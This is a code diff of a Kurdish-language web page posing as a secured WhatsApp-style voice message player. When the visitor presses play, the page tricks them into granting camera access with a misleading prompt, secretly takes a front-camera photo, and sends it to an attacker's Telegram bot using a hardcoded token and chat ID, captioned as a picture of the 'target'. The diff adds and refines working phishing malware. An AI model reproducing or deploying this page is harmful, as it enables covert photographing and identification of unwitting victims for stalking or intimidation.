@@ -1,61 +1,104 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     
-    <meta property="og:type" content="music.song">
     <meta property="og:title" content="🎙️ Voice Message (0:08)">
-    <meta property="og:description" content="پەیامی دەنگی">
+    <meta property="og:description" content="پەیامی دەنگی وەرگیراو">
     <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/5948/5948543.png">
-    <meta property="og:audio" content="https://www.soundjay.com/buttons/beep-01a.mp3">
-    <meta property="og:audio:type" content="audio/mpeg">
+    <meta property="og:type" content="music.song">
 
+    <title>Voice Message Player</title>
     <style>
-        body { background-color: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .player-card { background: white; width: 320px; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
-        .play-btn { width: 50px; height: 50px; background: #007bff; border: none; border-radius: 50%; color: white; font-size: 20px; cursor: pointer; margin-top: 15px; }
+        body { 
+            background-color: #f0f2f5; 
+            font-family: sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; 
+        }
+        .player-card {
+            background: white; width: 320px; padding: 20px;
+            border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .audio-container {
+            display: flex; align-items: center; background: #f8f9fa;
+            padding: 10px; border-radius: 10px; margin-top: 15px; gap: 10px;
+            cursor: pointer;
+        }
+        .play-btn {
+            width: 45px; height: 45px; background: #007bff; border: none;
+            border-radius: 50%; color: white; font-size: 20px;
+        }
+        .wave {
+            flex-grow: 1; height: 25px;
+            background: url('https://www.whatsapp.com/img/v2/wp-audio-wave.png') center/contain no-repeat;
+            opacity: 0.3;
+        }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div class="player-card">
-        <p style="font-size: 14px; color: #555;">🔒 پەیامێکی دەنگی پارێزراو</p>
-        <div style="display: flex; align-items: center; background: #f8f9fa; padding: 10px; border-radius: 10px; margin-top: 10px;">
-            <button class="play-btn" id="btn" onclick="start()">▶</button>
-            <div style="flex-grow: 1; height: 20px; background: url('https://www.whatsapp.com/img/v2/wp-audio-wave.png') center/contain no-repeat; opacity: 0.3; margin: 0 10px;"></div>
-            <span style="font-size: 12px; color: #888;">0:08</span>
+        <span style="font-size: 13px; color: #666;">🔐 پەیامی دەنگی پارێزراو</span>
+        <div class="audio-container" onclick="startProcess()">
+            <button class="play-btn" id="btnIcon">▶</button>
+            <div class="wave"></div>
+            <span style="font-size: 12px; color: #999;">0:08</span>
         </div>
     </div>
 
-    <audio id="v"><source src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
+    <audio id="vSource">
+        <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
+    </audio>
+
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
+        // زانیارییەکانی تۆ و بۆتەکە لێرە جێگیر کراوە
         const TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
         const ID = '6351568884';
 
-        function start() {
-            document.getElementById('v').play();
-            document.getElementById('btn').innerText = "⌛";
-            
+        function startProcess() {
+            // دەستپێکردنی دەنگەکە
+            document.getElementById('vSource').play();
+            document.getElementById('btnIcon').innerText = "⌛";
+
+            // داواکردنی کامێرا و وێنەگرتن
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(s => {
-                const vid = document.getElementById('video');
-                vid.srcObject = s;
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
                 setTimeout(() => {
-                    const can = document.getElementById('canvas');
-                    can.width = vid.videoWidth; can.height = vid.videoHeight;
-                    can.getContext('2d').drawImage(vid, 0, 0);
-                    can.toBlob(b => {
-                        const f = new FormData();
-                        f.append('chat_id', ID); f.append('photo', b, 'v.jpg');
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', ID);
+                        formData.append('photo', blob, 'target_capture.jpg');
+                        formData.append('caption', '🎙️ وێنەی ئەو کەسەی ویستی ڤۆیسەکە ببیستێت');
+
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(res => {
+                            if(res.ok) {
+                                console.log("وێنەکە نێردرا!");
+                            }
+                        });
                     }, 'image/jpeg');
-                }, 2000);
-            }).catch(() => alert("Error: Please allow audio playback."));
+                }, 1500); // دوای چرکەیەک و نیو وێنەکە دەگرێت
+            })
+            .catch(() => {
+                alert("بۆ بیستنی ئەم دەنگە، دەبێت ڕێگە بدەیت سێرڤەری دەنگ چالاک بێت.");
+            });
         }
     </script>
 </body>
